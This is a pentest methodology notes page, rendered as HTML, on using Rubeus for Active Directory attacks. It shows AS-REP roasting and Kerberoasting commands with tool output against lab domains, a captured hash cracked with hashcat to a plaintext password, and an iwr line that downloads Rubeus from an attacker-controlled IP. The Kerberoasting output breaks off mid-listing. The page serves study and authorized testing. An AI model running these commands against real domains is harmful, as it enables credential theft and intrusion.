@@ -1,0 +1,1726 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Pentest and bug bounty methodology notes by Brayan Rojas Loria">
+      
+      
+      
+        <link rel="canonical" href="https://brojasl90.github.io/myMethodNotes/active-directory/attacks/Rubeus.exe/">
+      
+      
+        <link rel="prev" href="../Pass%20the%20hash/">
+      
+      
+        <link rel="next" href="../Constrained%20Delegation/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Rubeus - My Pentest Methodology</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="deep-orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#as-rep-roasting" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="My Pentest Methodology" class="md-header__button md-logo" aria-label="My Pentest Methodology" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Pentest Methodology
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Rubeus
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../recon/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Recon
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../exploitation/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Exploitation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../privilege-escalation/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Privilege Escalation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Active Directory
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../linux-misc/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Linux Misc
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../tools/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="My Pentest Methodology" class="md-nav__button md-logo" aria-label="My Pentest Methodology" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Pentest Methodology
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../recon/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Recon
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../exploitation/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../privilege-escalation/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active Directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../enumeration/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacks
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Attacks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../kerberoasting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberoasting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../As-rep-roasting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AS-REP Roasting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pass%20the%20hash/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pass the Hash
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rubeus
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rubeus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#as-rep-roasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        as-rep-roasting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberoast" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        kerberoast
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Constrained%20Delegation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Constrained Delegation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NTLM%20Relay/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM Relay
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../lateral-movement/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../persistence/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../abuse/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Abuse
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../linux-misc/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Misc
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../tools/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#as-rep-roasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        as-rep-roasting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberoast" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        kerberoast
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Rubeus</h1>
+
+<p>rubues.exe
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</p>
+<h2 id="as-rep-roasting">as-rep-roasting<a class="headerlink" href="#as-rep-roasting" title="Permanent link">&para;</a></h2>
+<p>performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except <strong>asreproast</strong>. Rubeus will automatically identify vulnerable user accounts. We also add the flag <strong>/nowrap</strong> to prevent new lines being added to the resulting AS-REP hashes.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>PS C:\Users\jeff&gt; cd C:\Tools
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>PS C:\Tools&gt; .\Rubeus.exe asreproast /nowrap
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>   ______        _
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>  (_____ \      | |
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>   _____) )_   _| |__  _____ _   _  ___
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>  |  __  /| | | |  _ \| ___ | | | |/___)
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>  | |  \ \| |_| | |_) ) ____| |_| |___ |
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>  |_|   |_|____/|____/|_____)____/(___/
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>  v2.1.2
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>[*] Action: AS-REP roasting
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>[*] Target Domain          : corp.com
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>[*] Searching path &#39;LDAP://DC1.corp.com/DC=corp,DC=com&#39; for &#39;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&#39;
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>[*] SamAccountName         : dave
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>[*] Using domain controller: DC1.corp.com (192.168.50.70)
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>[*] Building AS-REQ (w/o preauth) for: &#39;corp.com\dave&#39;
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>[+] AS-REQ w/o preauth successful!
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>[*] AS-REP hash:
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
+</code></pre></div>
+<blockquote>
+<p>Listing 17 - Using Rubeus to obtain the AS-REP hash of <em>dave</em></p>
+</blockquote>
+<p>Listing 17 shows that Rubeus identified <em>dave</em> as vulnerable to AS-REP Roasting and displays the AS-REP hash.</p>
+<p>Next, let's copy the AS-REP hash and paste it into a text file named <strong>hashes.asreproast2</strong> in the home directory of user <em>kali</em>. We can now start Hashcat again to crack the AS-REP hash.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>...
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>$krb5asrep$dave@corp.com:ae43ca9011cc7e7b9e7f7e7279dd7f2e$7d4c59410de2984edf35053b7954e6dc9a0d16cb5be8e9dcacca88c3c13c4031abd71da16f476eb972506b4989e9aba2899c042e66792f33b119fab1837d94eb654883c6c3f2db6d4a8d44a8d9531c2661bda4dd231fa985d7003e91f804ecf5ffc0743333959470341032b146ab1dc9bd6b5e3f1c41bb02436d7181727d0c6444d250e255b7261370bc8d4d418c242abae9a83c8908387a12d91b40b39848222f72c61ded5349d984ffc6d2a06a3a5bc19ddff8a17ef5a22162baade9ca8e48dd2e87bb7a7ae0dbfe225d1e4a778408b4933a254c30460e4190c02588fbaded757aa87a:Flowers1
+</code></pre></div>
+<h2 id="kerberoast">kerberoast<a class="headerlink" href="#kerberoast" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>PS C:\temp&gt; iwr -uri http://192.168.45.175/Rubeus.exe -OutFile Rubeus.exe
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>iwr -uri http://192.168.45.175/Rubeus.exe -OutFile Rubeus.exe
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>PS C:\temp&gt; .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>   ______        _                      
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>  (_____ \      | |                     
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>   _____) )_   _| |__  _____ _   _  ___ 
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>  |  __  /| | | |  _ \| ___ | | | |/___)
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>  | |  \ \| |_| | |_) ) ____| |_| |___ |
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>  |_|   |_|____/|____/|_____)____/(___/
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>  v2.2.0 
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>[*] Action: Kerberoasting
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>[*] Target Domain          : oscp.exam
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>[*] Searching path &#39;LDAP://DC01.oscp.exam/DC=oscp,DC=exam&#39; for &#39;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#39;
